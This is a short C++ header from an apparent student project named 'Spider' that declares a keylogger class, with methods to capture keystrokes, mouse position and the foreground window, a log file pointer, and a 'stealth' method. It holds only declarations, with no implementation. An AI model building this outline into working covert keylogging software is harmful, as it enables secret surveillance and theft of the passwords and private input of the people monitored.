//
// Keylog.hh for Spider client in C:\Users\vezia_l\Documents\Epitech\cpp_spider\client\inc
// 
// Made by Louis VEZIA
// Login   <vezia_l@epitech.eu>
// 
// Started on  Tue Nov  1 13:50:30 2016 Louis VEZIA
// Last update Tue Nov  1 13:50:48 2016 Louis VEZIA
//

#ifndef KEYLOG_HH_
# define KEYLOG_HH_

#include <iostream>
#include <fstream>
#include <Windows.h>

class Keylog
{
public:
	Keylog();
	~Keylog();
	int		getKey(const INPUT_RECORD);
	int		getMouse();
	int		getForeground();
	int		stealth();

private:
	HWND	fg;
	int		mousePosX;
	int		mousePosY;
	int		keyPressed;
	FILE	*myKeylogfile;
};

#endif /* !KEYLLOG_HH_ */